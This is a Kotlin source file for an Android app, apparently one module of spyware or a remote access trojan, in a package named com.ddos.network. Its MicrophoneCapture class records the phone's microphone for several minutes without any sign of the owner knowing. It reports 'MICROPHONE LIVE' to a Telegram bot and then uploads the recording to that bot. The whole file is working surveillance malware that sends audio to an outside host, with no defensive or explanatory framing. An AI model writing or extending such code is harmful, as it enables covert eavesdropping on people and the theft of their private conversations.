package com.ddos.network

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import java.io.File

class MicrophoneCapture(
    private val context: Context,
    private val bot: TelegramBot
) {
    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var isRecording = false
    private val handler = Handler(Looper.getMainLooper())

    fun startLiveCapture(durationMinutes: Int = 5) {
        if (isRecording) return

        try {
            outputFile = File(
                context.getExternalFilesDir(null),
                "mic_${System.currentTimeMillis()}.m4a"
            )

            recorder = if (Build.VERSION.SDK_INT >= 31) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(outputFile?.absolutePath)
                prepare()
                start()
            }

            isRecording = true
            bot.sendMessage("🎤 MICROPHONE LIVE\n⏱ Recording for $durationMinutes minutes...")

            // Stop after duration
            handler.postDelayed({
                stopAndUpload()
            }, durationMinutes * 60 * 1000L)

        } catch (e: Exception) {
            bot.sendMessage("❌ Microphone failed: ${e.message}")
        }
    }

    fun stopAndUpload() {
        if (!isRecording) return

        try {
            recorder?.apply {
                stop()
                release()
            }
        } catch (e: Exception) {
            // Already stopped
        }

        recorder = null
        isRecording = false

        outputFile?.let { file ->
            if (file.exists() && file.length() > 1000) {
                bot.uploadAudio(file)
            }
        }
    }

    fun isCurrentlyRecording(): Boolean = isRecording
}
